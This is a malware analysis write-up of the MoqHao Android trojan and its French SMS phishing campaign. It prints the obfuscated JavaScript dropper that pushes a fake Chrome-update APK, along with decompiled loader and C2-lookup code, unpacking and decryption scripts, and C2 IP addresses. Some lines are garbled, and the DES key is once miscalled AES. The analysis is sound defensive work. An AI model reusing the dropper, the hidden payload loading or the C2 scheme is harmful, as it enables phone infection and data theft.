{
    "id": "83e6cd95-b6da-427c-b0bd-ba2a33e35700",
    "created_at": "2023-01-12T15:08:04.936469Z",
    "updated_at": "2025-03-27T02:10:04.940208Z",
    "deleted_at": null,
    "sha1_hash": "d60baaf99497d552c23ebfd8d3ace03e0fcafa72",
    "title": "2022-08-11 - MoqHao Android malware analysis and phishing campaign",
    "authors": "",
    "file_creation_date": "2022-09-01T10:15:19Z",
    "file_modification_date": "2022-09-01T10:15:19Z",
    "file_size": 2715903,
    "plain_text": "# MoqHao Android malware analysis and phishing campaign\n\n**xanhacks.xyz/p/moqhao-malware-analysis**\n\n## Analysis of MoqHao Android malware\n\n TL;DR\n\n\nAugust 11, 2022\n\n\n#### The Roaming Mantis cyber threat actor is currently targeting France with an SMS phishing campaign in order to deliver a malicious Android application. This malware is named MoqHao, it contains its code in an encrypted and compressed resource. Once the resource is launched, MoqHao retrieves the IP address of its Command & Control server by decrypting the “About” section of Imgur’s profile.\n\n You can find samples and Python scripts on this Github repository.\n\n## Introduction\n\n#### Recently, both Alol and I received multiple phishing SMS (or “smishing”) with the same pattern.\nThese SMS leads us to download malicious APK. Let’s investigate!\n\n## Smishing campain\n\n#### The smishing campaign has been targeting France for at least 1-2 months. The chain of infection is quite simple.\n\n The victim clicks on the link in the SMS. Then, the site checks if the User-Agent is an Android/iPhone device and if the IP address comes from France (geofencing). If it is not the case, you receive a 404 not found. Otherwise, Android devices will be redirected to download a malicious APK and iPhone devices to a phishing website to steal iCloud credentials.\n\n Example of phishing SMS :\n\n\n-----\n\n#### EN : Your package has been sent. Please check it and receive it. hxxp://shbuf.bwdbu.com/\n\n In this article, we will focus on the Android malicious application, named MoqHao. It is automatically downloaded when we click on the link in the SMS thanks to following Javascript snippet :\n\n\n-----\n\n```\n  $ curl http://shbuf.bwdbu.com/ -A \"Mozilla/5.0 (Android 11; Mobile Firefox/83)\"\n\n  <html>\n\n  <head>\n\n    <title></title>\n\n  </head>\n\n  <body>\n\n  <div>\n\n    <script>\n\n      var arr =\n  \"14964,14969,14960,14951,14945,14909,14903,14932,14963,14972,14971,14901,14961,14898,14964,14947,14970,14972,14951,14901,14944,14971\n  on(a){return a|0});\n\n      var b = arr[arr.length-1];\n\n      for(var i=0;i<arr.length-1;i++) {\n\n        arr[i] =arr[i]^b;\n\n      }\n\n      arr.pop();\n\n      eval(String.fromCharCode(...arr));\n\n    </script>\n\n  </div>\n\n  </body>\n\n  </html>\n\n#### We can simply replace the eval function with a console.log and executes it to get the following clean JS code.\n  alert(\"Afin d'avoir une meilleure expérience, veuillez mettre à jour votre navigateur Chrome à la dernière\n  version\");\n\n  location.replace(\"/hxdsvgyeiw.apk\");\n\n This code opens a popup which says “For a better experience, please update your Chrome browser to the latest version”.\nThen redirects you to the android malware ( /hxdsvgyeiw.apk ).\n\n The name of the APK changes every time you request the website. The resource folder name and the resource name of the malware is also changed every time to bypass hash/string detection signature by AV.\n  $ sha256sum samples/*apk\n\n  d18cbb0dc2321ef6ed05fea165afb19f2b23b651906ecfe3fe594f47377daa23 \n  samples/rosolhvtig.apk\n\n  7da86d30b325db5989f44a500c25df9bf76fcb94eae2bee26c8a851d47094b8e \n  samples/ykvfcdselh.apk\n\n You can check rosolhvtig.apk on VirusTotal, link.\n\n```\n\n-----\n\n## Malware analysis\n\n#### Here is the list of tools I used in this analysis with their purpose :\n\n jadx-gui (Java/DEX decompiler) Ghidra (Native library disassembler/decompiler) AVD (Run and manage Android VMs) Frida (Hooks functions inside Android app) Burpsuite (HTTP proxy)\n\n### Overview of the application\n\n#### We can use jadx-gui to view the source code of the malware.\n\n Before diving into the code, we can notice two things in the file structure. We have a native library ( libvg.so ) and a resource with a weird name ( 1eqlsfh ). Let’s check the entropy (randomness of data) of the resource on CyberChef.\n\n\n-----\n\n#### We get 7.99 as entropy, this means that the resource is encrypted and/or compressed. We can keep that in mind for later.\n\n In the AndroidManifest.xml, we can extract the permissions and the name of the MainActivity.\n```\n  <?xml version=\"1.0\" encoding=\"utf-8\"?>\n\n  <manifest xmlns:android=\"http://schemas.android.com/apk/res/android\" android:versionCode=\"11\" android:versionName=\"96\"\n  android:compileSdkVersion=\"23\" android:compileSdkVersionCodename=\"6.0-2438415\" package=\"fzicp.hmoj.zqzf.cnuxf\"\n  platformBuildVersionCode=\"23\" platformBuildVersionName=\"6.0-2438415\">\n\n    <uses-sdk android:minSdkVersion=\"18\" android:targetSdkVersion=\"21\"/>\n\n    <uses-permission android:name=\"android.permission.ACCESS_WIFI_STATE\"/>\n\n    <uses-permission android:name=\"android.permission.CHANGE_NETWORK_STATE\"/>\n\n    <uses-permission android:name=\"android.permission.CALL_PHONE\"/>\n\n    <uses-permission android:name=\"android.permission.WRITE_EXTERNAL_STORAGE\"/>\n\n    <uses-permission android:name=\"android.permission.READ_EXTERNAL_STORAGE\"/>\n\n    <uses-permission android:name=\"android.permission.ACCESS_NETWORK_STATE\"/>\n\n    <uses-permission android:name=\"android.permission.MODIFY_AUDIO_SETTINGS\"/>\n\n    <uses-permission android:name=\"android.permission.RECEIVE_BOOT_COMPLETED\"/>\n\n    <uses-permission android:name=\"yytp.hytm.bzkzk\"/>\n\n    <uses-permission android:name=\"anjccte.cepa.jnch\"/>\n\n    <uses-permission android:name=\"android.permission.WAKE_LOCK\"/>\n\n    <uses-permission android:name=\"android.permission.INTERNET\"/>\n\n    <uses-permission android:name=\"android.permission.RECEIVE_SMS\"/>\n\n    <uses-permission android:name=\"android.permission.READ_SMS\"/>\n\n    <uses-permission android:name=\"android.permission.SEND_SMS\"/>\n\n    <uses-permission android:name=\"android.permission.SYSTEM_ALERT_WINDOW\"/>\n\n    <uses-permission android:name=\"android.permission.READ_CONTACTS\"/>\n\n    <uses-permission android:name=\"android.permission.READ_PHONE_STATE\"/>\n\n    <uses-permission android:name=\"android.permission.GET_ACCOUNTS\"/>\n\n    <uses-permission android:name=\"android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS\"/>\n\n    <application android:label=\"Chгome\" android:icon=\"@drawable/ic_launcher\" android:name=\"gb9i3m6.RgApplication\">\n\n      <activity android:theme=\"@android:style/Theme.Translucent.NoTitleBar.Fullscreen\" android:name=\"gb9i3m6.YrActivity\"\n  android:exported=\"true\" android:excludeFromRecents=\"true\">\n        <intent-filter>\n\n          <action android:name=\"android.intent.action.MAIN\"/>\n\n          <category android:name=\"android.intent.category.LAUNCHER\"/>\n\n        </intent-filter>\n\n      </activity>\n\n  ...\n\n```\n\n-----\n\n#### Of course, the malware requires a large number of permissions, we can already make assumptions about the potential functionality of the malware.\n\n Here is the code of the MainActivity ( gb9i3m6.YrActivity ) :\n```\n  package gb9i3m6;\n\n  import android.app.Activity;\n\n  import android.content.Context;\n\n  import android.os.Bundle;\n\n  import s.ni;\n\n  public class YrActivity extends Activity {\n\n    private static Object a(String str, String str2, boolean z, int i, boolean z2, String\n  str3) {\n\n      return ni.qc(str, str2, 1L, str3, 3, false, 0);\n\n    }\n\n    private static Object b(Context context) {\n\n      return ni.pe(context, 0);\n\n    }\n\n    @Override // android.app.Activity\n\n    protected void onCreate(Bundle bundle) {\n\n      super.onCreate(bundle);\n\n      Ud.c(this); // Create Ud instance from static function, then create new\n  RgApplication\n\n      Object[] objArr = new Object[2];\n\n      try {\n\n        Object b = b(this);\n\n        objArr[1] = a(getPackageName(), YrActivity.class.getName(), false, 0, false,\n  \"0\");\n\n        objArr[0] = b;\n\n      } catch (Exception unused) {\n\n      }\n\n      ni.jf(\"\", objArr, 2, 0L, 1, false, 0, true, 1L, false);\n\n       finish();\n\n```\n\n-----\n\n```\n  }\n\n#### As you can see, the code is obfuscated and we have a lot of native library calls. All the calls are described here :\n  package s;\n\n  public class ni {\n\n    public static native Object iz(Class cls);\n\n    public static native void jf(String str, Object[] objArr, int i, long j, int i2, boolean z, int i3, boolean z2, long j2,\n  boolean z3);\n\n    public static native String ls(int i);\n\n    public static native Object mz(String str, String str2, int i, boolean z);\n\n    public static native Object oa(String str, Object obj, int i, boolean z, int i2);\n\n    public static native void ob(Object obj, Object obj2);\n\n    public static native String om(String str, String str2);\n\n    public static native void op(Object obj, Object obj2, Object obj3, long j, boolean z, int i, String str);\n\n    public static native String oq(Object obj, int i, String str, boolean z);\n\n    public static native Object or(String str, Object obj, int i);\n\n    public static native Object pe(Object obj, int i);\n\n\n```\n\n-----\n\n```\n    public static native void pq(Object obj, Object obj2, Object obj3, Object obj4, String str, int i, long j, boolean z, int\n  i2, long j2);\n\n    public static native Object qc(String str, String str2, long j, String str3, int i, boolean z, int i2);\n\n  }\n\n### Native library analysis\n\n#### The interesting part is inside the RgApplication.java file :\n  public class RgApplication extends Application {\n\n    public Object a;\n\n    public Class b;\n\n    private void a(Object obj) {\n\n      Class cls = (Class) ni.oa(ni.ls(1), obj, 1, true, 0); //\n  ClassLoader.loadClass(\"com.Loader\")\n\n      this.b = cls;\n\n      this.a = ni.iz(cls); // instantiate \"com.Loader\" Object\n\n    }\n\n    // [3] Write the resource to <...>/files/b and launch it\n\n    private void b(String str, Object obj) {\n\n      String oq = ni.oq(this, 1, \"\", true); // Get the absolut path of the \"files\" directory\n\n      String om = ni.om(oq, \"b\"); // Concatenate \"/b\" to the absolut path\n\n      e(om, obj); // write unpacked resource to \"<app>/files/b\"\n\n      a(f(0, str, oq, om)); // new com.Loader() (Entrypoint of the unpacked DEX library)\n\n```\n\n-----\n\n```\n  // [2] Unpack the resource inside \"xmdop\" and call b(...)\n\n  private void c(Object obj) {\n\n    // ni.pi(this, obj, 1, false, \"\") : XOR and deflate the resource inside \"xmdop\"\n\n    b(obj.toString(), ni.pi(this, obj, 1, false, \"\"));\n\n  }\n\n  // [1] Call on Object creation\n\n  private void d() {\n\n    // load native library libvg.so\n\n    Runtime.getRuntime().load(((PathClassLoader) getClassLoader()).findLibrary(\"vg\"));\n\n    c(\"xmdop\"); // \"xmdop\" = resource folder name\n\n  }\n\n  private static Object e(String str, Object obj) {\n\n    return ni.or(str, obj, 0); // write data to a file\n\n  }\n\n  private Object f(int i, String str, String str2, String str3) {\n\n    return ni.mz(str3, ni.om(str2, str).toString(), 1, false); // new object ClassLoader\n\n  }\n\n  @Override // android.app.Application\n\n  public void onCreate() {\n\n    super.onCreate();\n\n    try {\n\n      d();\n\n    } catch (Throwable unused) {\n\n  }\n\n}\n\n```\n\n-----\n\n#### First, the method d() is called, it loads the native library libvg.so and call c(\"xmdop\") (the parameter corresponds to the name of the resource folder).\n\n Secondly, the method c(\"xmdop\") unpack the resource (XOR and zlib decompression) and call b(\"xmdop\", \"<unpacked_resource>\") .\n\n Finally, the method b(\"xmdop\", \"<unpacked_resource>\"), save the unpacked resource at /data/data/<package_name>/files/b and launch the unpacked resource which is a DEX file via ClassLoader.loadClass(\"com.Loader\") .\n```\ncom.Loader is a name of a class inside the unpacked resource.\n\n### Unpack the resource\n\n#### Now, there are two ways to get the unpacked resource :\n\n 1. Using adb to pull the DEX code directly from the infected device : adb pull /data/data/<package_name>/files/b . 2. Using static code analysis of the native library function ni.pi(...) to find how the resource is unpacked.\n\n The first argument of JNI functions is always JNIEnv * . The JNIEnv type is a pointer to a structure storing all JNI function pointers. Each function is accessible at a fixed offset through the JNIEnv argument.\n  typedef const struct JNINativeInterface\n  *JNIEnv;\n\n You can find the list of functions and offsets on this spreadsheet. The JNIEnv structure can be downloaded as Ghidra Data Type (GDT), jni_all.gdt. So, you can import it on Ghidra and it will resolve automatically functions names when you change the JNI function signature.\n\n```\n\n-----\n\n#### JNI functions at a JNIEnv offset are now automatically resolved. This improves the readability of decompiled C code. There is the decompiled C code of the ni.pi(...) function :\n\n\n-----\n\n#### s you ca see o t e sc ee s ot abo e, t e esou ce see s to be O ed a d deco p essed ( b) et s s tc to t e asse b e e to find the key of the XOR.\n```\n  ; [*] Get the first 12 bytes of the resource and stores it in r0\n\n  8c9e : ldr.w r0, [fp]\n\n  8ca2 : mov r1, r4\n\n  8ca4 : movs r2, #0\n\n  8ca6 : movs r3, #12     ; r3 = 12\n\n  8ca8 : ldr.w r6, [r0, #800] ; offset of GetByteArrayRegion in JNIEnv struct\n\n  8cac : add r0, sp, #44   ; r0 = sp + 44\n\n  8cae : str r0, [sp, #0]  ; r0 = address of the buffer\n\n  8cb0 : mov r0, fp\n\n  8cb2 : blx r6\n\n  ; [*] Create a new Byte Array of 512 bytes\n\n  ; r4 = 11th bytes of the resource\n\n  8cb4 : ldr.w r0, [fp]\n\n  8cb8 : mov.w r1, #512 ; r1 = 512\n\n  8cbc : mov r6, r5\n\n  8cbe : ldrb.w r4, [sp, #55]  ; r4 = r0 + 11, the 11th bytes of the resource\n\n  8cc2 : ldr.w r2, [r0, #704] ; offset of NewByteArray in JNIEnv struct\n\n  8cc6 : mov r0, fp\n\n  8cc8 : blx r2       \n\n  8cca : sub.w sl, r7, #185\n\n  8cce : mov r5, r0\n\n  8cd0 : movs r0, #0\n\n  8cd2 : strd r0, r0, [sp, #32]  ; Initialize vector struct to store unxored resource\n\n                    ; #32 = vector.lpStart, #36 = vector.lpLastData\n\n  8cd6 : str r0, [sp, #40]    ; #40 = vector.lpEnd\n\n  8cd8 : str r5, [sp, #24]\n\n  8cda : str r6, [sp, #16]\n\n  ; [*] Loop to read the resource (512 bytes block), start from 12th bytes\n\n  8cdc : ldr r1, [sp, #20]\n\n  8cde : mov r0, fp     ; r0 = *JNIEnv\n\n  8ce0 : mov r2, r6     ; r2 = InputStream -> int read(byte[] b)\n\n  8ce2 : mov r3, r5     ; r3 = addr of 512 bytes array\n\n  8ce4 : blx 7d64 <_ZN7_JNIEnv13CallIntMethodEP8_jobjectP10_jmethodIDz@plt>\n\n  8ce8 : mov r8, r0\n\n  8cea : cmp r0, #0\n\n  8cec : blt.n 8d4e <Java_s_ni_pi@@Base+0x23e>\n\n  8cee : ldr.w r0, [fp]\n\n  8cf2 : ldr.w r3, [r0, #736] ; offset of GetByteArrayElements in JNIEnv struct\n\n  8cf6 : mov r0, fp\n\n  8cf8 : mov r1, r5\n\n  8cfa : movs r2, #0\n\n  8cfc : blx r3\n\n  8cfe : add r6, sp, #32\n\n  8d00 : mov r5, fp\n\n  8d02 : mov r9, r0     ; r9 = @(bytes array return by GetByteArrayElements)\n\n  8d04 : mov.w fp, #0     ; i = 0\n\n  8d08 : b.n 8d32 <Java_s_ni_pi@@Base+0x222>\n\n  ; [*] Loop to XOR (byte per byte) the byte array with r4\n\n  8d0a : ldrb.w r1, [r9, fp]    ; r1 = resource[i], resource byte at index i\n\n  8d0e : ldrd r0, r2, [sp, #36]    ; r0 = vector.lpLastData, r2 = vector.lpEnd\n\n  8d12 : eors r1, r4       ; r1 ^= r4 (r4 is still equal to the 11th bytes of the resource)\n\n  8d14 : cmp r0, r2       ; cmp vector.lpLastData == vector.lpEnd\n\n  8d16 : strb.w r1, [r7, #-185]\n\n  8d1a : bcs.n 8d26 <Java_s_ni_pi@@Base+0x216>\n\n  8d1c : strb r1, [r0, #0]\n\n  8d1e : ldr r0, [sp, #36]  ; *(vector.lpLastData) = r1 (unxored byte)\n\n  8d20 : adds r0, #1     ; vector.lpLastData += 1\n\n  8d22 : str r0, [sp, #36]\n\n  8d24 : b.n 8d2e <Java_s_ni_pi@@Base+0x21e>\n\n  8d26 : mov r0, r6     ; r0 = @vector\n\n  8d28 : mov r1, sl     ; r1 = unxored byte\n\n  ; https://stackoverflow.com/questions/51457322/what-is-stdvector-emplace-back-slow-path-stdvector-push-back  slow-path\n\n  8d2a : blx 7d70 <_ZNSt6__ndk16vectorIaNS_9allocatorIaEEE21__push_back_slow_pathIaEEvOT_@plt>\n\n  8d2e : add.w fp, fp, #1   ; i = i + 1\n\n  8d32 : cmp fp, r8     ; cmp i == number of bytes read by InputStream -> int read(byte[] b)\n\n  8d34 : blt.n 8d0a <Java_s_ni_pi@@Base+0x1fa> ; jmp 0x8d0a (XOR loop)\n\n```\n\n-----\n\n-----\n\n#### I would like to thanks Christophe for helping me on the ARM reverse engineering.\n\n The resource (from the 12th byte to the end of the file) is XORed with the 11th byte of this same resource. So, we have the XOR key ! Let’s write a Python script to automatically unpack the resource.\n\n The size of the unpack resource is indicated on bytes 8, 9 and 10 but is not used in the assembly code. We will use the size in the Python script to make it more stable.\n\n\n-----\n\n```\n  #!/usr/bin/env python3\n\n  from sys import argv, exit as sys_exit\n\n  from zlib import decompress\n\n\n  def unpack(path):\n\n    \"\"\"Unpack resource of MoqHao malware.\"\"\"\n\n    with open(path, \"rb\") as resource, open(path + \".dex\", \"wb\") as\n  dex:\n\n      data = resource.read()\n\n      size = data[10] | data[9] << 8 | data[8] << 16\n\n      xor_key = data[11]\n\n      dec = bytes(data[12 + i] ^ xor_key for i in range(size))\n\n      dex.write(decompress(dec))\n\n      print(\"[*] Unpacked at '\" + path + \".dex'.\")\n\n\n  if __name__ == \"__main__\":\n\n    if len(argv) != 2:\n\n      print(\"[!] Usage : \" + argv[0] + \" <resource>\")\n\n      sys_exit(1)\n\n    unpack(argv[1])\n\n#### Once we run the script, we get a Dalvik dex file.\n  $ python3 unpack.py rosolhvtig/assets/xmdop/1eqlsfh\n\n  [*] Unpacked at 'rosolhvtig/assets/xmdop/1eqlsfh.dex'.\n\n  $ file rosolhvtig/assets/xmdop/1eqlsfh.dex\n\n  rosolhvtig/assets/xmdop/1eqlsfh.dex: Dalvik dex file\n  version 035\n\n```\n\n-----\n\n#### e ca c ec t at ou sc pt o s co ect y by co pa g t e obta ed e t t e esou ce u pac ed by oq ao\n```\n  $ sha256sum rosolhvtig/assets/xmdop/1eqlsfh.dex\n\n  3ec148623983c6f68b522a182d72330d93ed62e5f57db81c40b8bbad128e1541 rosolhvtig/assets/xmdop/1eqlsfh.dex\n\n  $ adb shell sha256sum /data/data/fzicp.hmoj.zqzf.cnuxf/files/b\n\n  3ec148623983c6f68b522a182d72330d93ed62e5f57db81c40b8bbad128e1541 \n  /data/data/fzicp.hmoj.zqzf.cnuxf/files/b\n\n We are good ! Now, let’s dive into the new DEX code analysis.\n\n### Retrieve C2 URL\n\n#### From the previous code analysis, we know that the unpacked resource is run by creating a new object of the class com.Loader .\njadx-gui gives us some statistics about the DEX file :\n  Classes:\n  615\n\n  Methods:\n  2876\n\n We will not go through all the classes and methods, but only the more important ones.\n\n In the code, we can see a lot of HTTP requests. To find where to start static code analysis, let’s run the application with Burpsuite as proxy. Maybe we will obtain a good entry point to focus our research on.\n\n```\n\n-----\n\n#### e e sta t oq ao, t e o o g equest s ade\n\n Here is the HTTP request in plaintext :\n```\n  GET /user/shaoye99/about HTTP/2\n\n  Host: imgur.com\n\n  User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121\n  Safari/537.36\n\n  Accept: text/html,*/*;q=0.8\n\n  Accept-Encoding: gzip, defate\n\n  Accept-Language: zh-CN,zh;0.8,en;q=0.6\n\n  Cache-Control: no-cache\n\n  Connection: Keep-Alive\n\n Let’s visit the link, hxxps://imgur.com/user/shaoye99/about :\n\n```\n\n-----\n\n#### The about section of the profile seems to contain encrypted data. Let’s use the previous information to start static code analysis.\n\n By searching for the string shaoye99, we came across the following line which is very interesting.\n```\n  private final String f279m =\n  \"chrome|shaoye77@imgur|shaoye88@imgur|shaoye99@imgur\";\n\n We can look for some cross-references and we get the following big function.\n  public final String getDefaultAccounts() {\n\n    return this.f279m;\n\n  }\n\n  public final String mo333a() {\n\n    // ...\n\n      String string = Loader.access$getPreferences$p(Loader.this).getString(\"addr_accounts\",\n  Loader.this.getDefaultAccounts());\n\n      // string = \"chrome|shaoye77@imgur|shaoye88@imgur|shaoye99@imgur\";\n\n      C0474i.m321c(string, \"addrAccountsStr\");\n\n      m204M = C0533v.m204M(string, new char[]{'|'}, false, 0, 6, null); // split on '|'\n\n      String locale = Locale.getDefault().toString();\n\n      C0474i.m321c(locale, \"Locale.getDefault().toString()\");\n\n      m217i = C0532u.m217i(locale, \"ko\", false, 2, null);\n\n      if (m217i) {\n\n        access$getPreferences$p = Loader.access$getPreferences$p(Loader.this);\n\n        obj = m204M.get(1); // if locale is 'ko', then use 'shaoye77@imgur'\n\n      } else {\n\n        m217i2 = C0532u.m217i(locale, \"ja\", false, 2, null);\n\n        if (m217i2) {\n\n          access$getPreferences$p = Loader.access$getPreferences$p(Loader.this);\n\n          obj = m204M.get(2); // if locale is 'ja', then use 'shaoye88@imgur'\n\n        } else {\n\n          access$getPreferences$p = Loader.access$getPreferences$p(Loader.this);\n\n          obj = m204M.get(3); // else use 'shaoye99@imgur'\n\n        }\n\n      }\n\n      String string2 = access$getPreferences$p.getString(\"account\", (String) obj);\n\n      // For french user, string2 = obj = 'shaoye99@imgur'\n\n      if (!C0474i.m323a(string2, \"unknown\")) {\n\n        C0474i.m321c(string2, \"account\");\n\n        String m759g = C0337t.m759g(string2); // Fetch C2 IP address\n\n        Log.d(\"WS\", \"ACC:\" + string2);\n\n         if (m759g == null) {\n\n```\n\n-----\n\n```\n        String string3 = Loader.access$getPreferences$p(Loader.this).getString(\"last_addr\", \"\");\n\n        if (!C0474i.m323a(string3, \"\")) {\n\n          m759g = string3;\n\n        }\n\n        this.f400c.f860a++;\n\n        return m759g;\n\n      }\n\n      m217i3 = C0532u.m217i(m759g, \"ssl://\", false, 2, null);\n\n      if (m217i3) {\n\n        str = C0532u.m221e(m759g, \"ssl://\", \"wss://\", false, 4, null);\n\n      } else {\n\n        str = \"ws://\" + m759g;\n\n      }\n\n      // Store C2 IP address into 'last_addr' SharedPreferences\n\n      Loader.access$getPreferences$p(Loader.this).edit().putString(\"last_addr\", str).apply();\n\n      return str;\n\n    }\n\n    throw new IllegalStateException(\"null......\");\n\n  }\n\n}\n\n```\n\n-----\n\n#### The string \"chrome|shaoye77@imgur|sha...\" is split with the separator | . Then, if the locale of the phone is :\n```\n   ko (Korean), use shaoye77@imgur\n   ja (Japan), use shaoye88@imgur\n\n else, use shaoye99@imgur\n\n Then, send the imgur profile to C0337t.m759g(string2); . With a French phone, we will get C0337t.m759g(\"shaoye99@imgur\");, this corresponds to the imgur profile we saw on Burpsuite.\n\n The m759g function returns the C2 IP & port (we will reverse it very soon), then store it inside “last_addr” SharedPreferences.\n\n So, to get the C2 IP address and port, we have two ways :\n\n 1. Extract last_addr from the SharedPreferences. 2. Analyse the function m759g to determine how MoqHao retrieves the C2 from the Imgur profiles.\n\n The first way is very simple, you just need to view the content of pref.xml :\n  $ adb shell cat\n  /data/data/<package_name>/shared_prefs/pref.xml\n\n  <?xml version='1.0' encoding='utf-8' standalone='yes' ?>\n\n  <map>\n\n    <int name=\"shut\" value=\"4\" />\n\n    <int name=\"create\" value=\"4\" />\n\n    <string\n  name=\"last_addr\">ws://107.148.160.222:28867</string>\n\n  </map>\n\n And bingo, we got our C2 ws://107.148.160.222:28867 !\n\n The second way, is also quite simple, we need to go through the Java code. Let’s do this by analysing the method C0337t.m759g(string2) :\n   bli t ti fi l St i 759 (St i t ) {\n\n```\n\n-----\n\n```\n  C0474i.m320d(str, \"acc\");\n\n  m204M = C0533v.m204M(str, new char[]{'@'}, false, 0, 6, null);\n\n  if (C0474i.m323a((String) m204M.get(1), \"debug\")) {\n\n    return (String) m204M.get(0);\n\n  }\n\n  if (C0474i.m323a((String) m204M.get(1), \"vk\")) {\n\n    return m752n((String) m204M.get(0));\n\n  }\n\n  if (C0474i.m323a((String) m204M.get(1), \"youtube\")) {\n\n    return m751o((String) m204M.get(0));\n\n  }\n\n  if (C0474i.m323a((String) m204M.get(1), \"ins\")) {\n\n    return m753m((String) m204M.get(0));\n\n  }\n\n  if (C0474i.m323a((String) m204M.get(1), \"GoogleDoc\")) {\n\n    return m756j((String) m204M.get(0));\n\n  }\n\n  if (C0474i.m323a((String) m204M.get(1), \"GoogleDoc2\")) {\n\n    return m755k((String) m204M.get(0));\n\n  }\n\n  if (C0474i.m323a((String) m204M.get(1), \"blogger\")) {\n\n    return m758h((String) m204M.get(0));\n\n  }\n\n  if (C0474i.m323a((String) m204M.get(1), \"blogspot\")) {\n\n    return m757i((String) m204M.get(0));\n\n  }\n\n  if (!C0474i.m323a((String) m204M.get(1), \"imgur\")) { // if NOT EQUALS to\nimgur\n\n    return null;\n\n  }\n\n  return m754l((String) m204M.get(0)); // then, imgur request is made\n\n}\n\n```\n\n-----\n\n```\nm759g calls a function with the name of the profile in parameter according to the platform used (imgur, vk, youtube, googledoc, …).\n\n#### For example, the string shaoye99@imgur is split on @ :\n   shaoye99 = m204M.get(0)\n   imgur = m204M.get(1)\n\n With our imgur profile, we will call m754l('shaoye99') . Its goal is to extract the about section of the imgur profile and decrypt it with DES in CBC mode.\n  // Extract about section\n\n  public static final java.lang.String m754l(java.lang.String r7) {\n\n    C0474i.m320d(str, \"acc\");\n\n    C0482q c0482q = C0482q.f864a;\n\n    String format = String.format(\"https://imgur.com/user/%s/about\", Arrays.copyOf(new Object[]{str},\n  1));\n\n    C0474i.m321c(format, \"java.lang.String.format(format, *args)\");\n\n    String str2 = null;\n\n    try {\n\n      // search for regex :\n\n      // - ffgtrrt([\\\\w_-]+?)ffgtrrt\n\n      // - bgfrewi([\\\\w_-]+?)bgfrewi\n\n      // - htynff([\\\\w_-]+?)htynff\n\n      // - gfjytg([\\\\w_-]+?)gfjytg\n\n      // - dseregn([\\\\w_-]+?)dseregn\n\n      // results in 'group' variable\n\n      if (group != null) {\n\n        str2 = m762d(group);\n\n      }\n\n    } catch (Exception e) {\n\n      e.printStackTrace();\n\n    }\n\n    if (str2 == null) {\n\n      Log.e(\"MSG\", \"DNS ERR\");\n\n    }\n\n    return str2;\n\n  }\n\n  // Base64 decode and call function to decrypt\n\n  public static final String m762d(String str) {\n\n    C0474i.m320d(str, \"str\"); // check str is not null\n\n    byte[] decode = Base64.decode(str, 8); // base64 decode\n\n    C0474i.m321c(decode, \"Base64.decode(str, 8)\"); // check decode is not null\n\n    return new String(m764b(decode, \"Ab5d1Q32\"), \"UTF-8\"); // decrypt with DES (mode CBC)\n\n  }\n\n  // Decrypt with KEY = IV = \"Ab5d1Q32\"\n\n  public static final byte[] m764b(byte[] bArr, String str) {\n\n      C0474i.m320d(bArr, \"src\");\n\n      C0474i.m320d(str, \"paramString\");\n\n      SecureRandom secureRandom = new SecureRandom();\n\n      Charset charset = C0510d.f880a;\n\n      byte[] bytes = str.getBytes(charset);\n\n      C0474i.m321c(bytes, \"(this as java.lang.String).getBytes(charset)\");\n\n      SecretKeySpec secretKeySpec = new SecretKeySpec(bytes, \"DES\");\n\n      Cipher cipher = Cipher.getInstance(\"DES/CBC/PKCS5Padding\");\n\n      byte[] bytes2 = str.getBytes(charset);\n\n      C0474i.m321c(bytes2, \"(this as java.lang.String).getBytes(charset)\");\n\n      cipher.init(2, secretKeySpec, new IvParameterSpec(bytes2), secureRandom);\n\n      byte[] doFinal = cipher.doFinal(bArr);\n\n      C0474i.m321c(doFinal, \"cipher.doFinal(src)\");\n\n      return doFinal;\n\n    }\n\n```\n\n-----\n\n#### As you can see, the AES key is harcoded, m764b(decode, \"Ab5d1Q32\"), and the IV is equal to the key.\n\n We can easily make a Python script to decrypt C2 URI.\n\n\n-----\n\n```\n  #!/usr/bin/env python3\n\n  from sys import argv, exit as sys_exit\n\n  from base64 import urlsafe_b64decode\n\n  from Crypto.Cipher import DES\n\n\n  KEY = b\"Ab5d1Q32\"\n\n  IV = KEY\n\n\n  def decrypt(ciphertext):\n\n    \"\"\"Decrypt MoqHao C2 URI.\"\"\"\n\n    for group in [\"ffgtrrt\", \"bgfrewi\", \"htynff\", \"gfjytg\",\n  \"dseregn\"]:\n\n      ciphertext = ciphertext.replace(group, \"\")\n\n    data = urlsafe_b64decode(ciphertext + \"==\")\n\n    cipher = DES.new(KEY, DES.MODE_CBC, iv=IV)\n\n    return cipher.decrypt(data)\n\n\n  if __name__ == \"__main__\":\n\n    if len(argv) != 2:\n\n      print(\"[!] Usage : \" + argv[0] + \" <ciphertext>\")\n\n      sys_exit(1)\n\n    decrypt(argv[1])\n\n#### There is an example :\n\n```\n\n-----\n\n```\n  $ python3 decrypt_c2.py\n\n  [!] Usage : decrypt_c2.py <ciphertext>\n\n  $ python3 decrypt_c2.py 'bgfrewiFaRPCdEp9o05vGWA  r0_i_IHXXynJgDlbgfrewi'\n\n  b'[*] Cleartext : 107.148.160.222:28867\\x03\\x03\\x03'\n\n#### We get the same C2 as with the SharedPreferences, voilà !\n\n## IOCs\n\n#### C2 IP address/port :\n\n 107.148.160.222:28867 134.119.218.100:28843 151.106.31.51:29870 27.255.75.200:28856 27.255.75.201:38866 61.97.243.111:28999\n\n Potential C2 IP based on hunting :\n\n 128.14.75.141 107.148.160.215 107.148.160.224 107.148.160.227 107.148.160.251 107.148.160.37 107.148.160.68 107.148.164.3 107.148.164.6 128.14.75.47 134.119.218.98 134.119.218.99 151.106.31.50 151.106.31.52 151.106.31.53 151.106.31.54 103.249.28.194 103.249.28.205 103.249.28.211 103.249.28.212 103.249.28.213 103.249.28.214 27.255.75.199 27.255.75.202 61.97.243.112 61.97.243.113 61.97.248.14 61.97.248.15 61.97.248.16 103.212.222.140 103.212.222.141 103.212.222.142 103.212.222.143 103.212.222.144 103.212.222.145 103.249.28.207 103.249.28.208 103.249.28.209 103.249.28.210 61.97.248.6 61 97 248 8\n\n```\n\n-----\n\n#### 5 9 8 45.114.129.49 45.114.129.50 45.114.129.52\n\n## Related content\n\n Unicorn obfuscated powershell analysis\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
